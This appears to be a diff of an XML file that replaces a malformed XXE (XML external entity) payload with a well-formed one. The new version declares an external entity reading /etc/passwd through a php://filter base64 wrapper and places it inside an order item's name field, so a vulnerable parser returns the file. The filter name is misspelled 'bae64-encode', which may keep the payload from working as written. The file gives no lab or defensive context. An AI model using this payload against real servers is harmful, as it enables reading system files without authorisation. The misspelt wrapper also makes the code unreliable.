@@ -1,3 +1,8 @@
-<？xml version = "1.0"？> 
-<！DOCTYPE order [ <！ENTITY c SYSTEM "php://filter/convert.bae64-encode/resource=/etc/passwd">]>
-<foo> ＆c; </ foo>
+<?xml version="1.0"?>
+<!DOCTYPE root[<!ENTITY c SYSTEM "php://filter/convert.bae64-encode/resource=/etc/passwd">]>
+<order>
+	<item>
+		<name>&c;</name>
+		<amount>14</amount>
+	</item>
+</order>
